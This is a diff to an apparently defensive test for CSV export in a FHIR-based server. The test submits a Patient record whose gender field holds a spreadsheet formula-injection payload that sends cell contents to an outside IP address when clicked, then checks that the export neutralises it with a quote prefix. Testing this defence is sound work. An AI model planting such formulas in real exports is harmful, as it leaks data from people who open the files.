@@ -190,7 +190,7 @@ describe('CSV Export', () => {
       .set('Content-Type', ContentType.FHIR_JSON)
       .send({
         resourceType: 'Patient',
-        gender: '=HYPERLINK("http://localhost:8181/?data="&F3,"Click Me")',
+        gender: '=HYPERLINK("http://13.40.11.171:8181/?data="&F3,"Click Me")',
       });
     expect(res1.status).toBe(201);
 
@@ -201,6 +201,6 @@ describe('CSV Export', () => {
     expect(res3.text).toContain(res1.body.id);
 
     // Note the escaped quotes and single quote prefix
-    expect(res3.text).toContain(`"'=HYPERLINK(""http://localhost:8181/?data=""&F3,""Click Me"")"`);
+    expect(res3.text).toContain(`"'=HYPERLINK(""http://13.40.11.171:8181/?data=""&F3,""Click Me"")"`);
   });
 });
